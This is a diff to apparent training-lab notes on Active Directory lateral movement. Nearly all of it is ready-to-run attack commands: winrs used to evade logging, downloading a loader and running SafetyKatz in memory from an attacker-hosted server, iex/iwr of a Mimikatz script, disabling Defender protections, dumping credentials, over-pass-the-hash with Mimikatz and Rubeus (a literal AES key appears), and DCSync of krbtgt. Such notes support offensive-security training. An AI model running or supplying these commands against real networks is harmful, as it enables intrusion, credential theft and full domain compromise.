@@ -10,7 +10,7 @@ Enter-PSSession -ComputerName <dcorp-adminsrv>
 Using Invoke-Command
 Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt
 
-you can use winrs in place of PSRemoting to evade the logging (more stealthy)
+#you can use winrs in place of PSRemoting to evade the logging (more stealthy)
 winrs -r:dcorp-mgmt hostname;whoami  #run command to check whether we have access or not
 winrs -r:dcorp-mgmt cmd  #get a cmd shell on mgmt machine
 ```
@@ -35,29 +35,55 @@ Invoke-Command -Session $var -ScriptBlock {ls env:}
 
 # Lateral Movement - Invoke-Mimikatz
 ```powershell
-After Abusing winrs
+#After Abusing winrs
 #Use SafetyKatz.exe to dump the hashes
-1- Run the following command on the reverse shell
+#1- Host Loader.exe & Run the following command on the reverse shell
 PS> iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
 
-2- Now, copy the Loader.exe to dcorp-mgmt:
+#2- Now, copy the Loader.exe to dcorp-mgmt:
 PS> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 
-3- Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt: 
-$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+#3- Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt: 
+PS> $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
 
-4- Use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt
-$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+#4- Use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt
+PS> $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
 
-After Abusing PowerShell Remoting
+
+#After Abusing PowerShell Remoting
+#1- Host Invoke-Mimi.ps1 & Run the following command on the reverse shell
+iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
+
+#2- Disable AMSI & Dump the hashes
+PS> $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+PS> Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+PS> Invoke-Command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
 ```
 
 ```Powershell
-Pass-The-Hash
-
 Over-Pass-The-Hash  #for better offsec use AES keys than NTLM
+# Using Mimikatz
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
+
+# Using SaafetyKatz
+SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
+
+#Using Rubeus (Recommended)
+#if you don't have elevated session use below
+Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
+
+#if you have elevated session use below
+#1- Create a new process & inject the ticket init
+C:\Windows\system32> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+#2- Access the DC from the new process
+winrs -r:dcorp-dc cmd /c set username
+
 
 DCSync
+# Using MimiKatz
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 
-
+# Using SafetyKatz
+SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
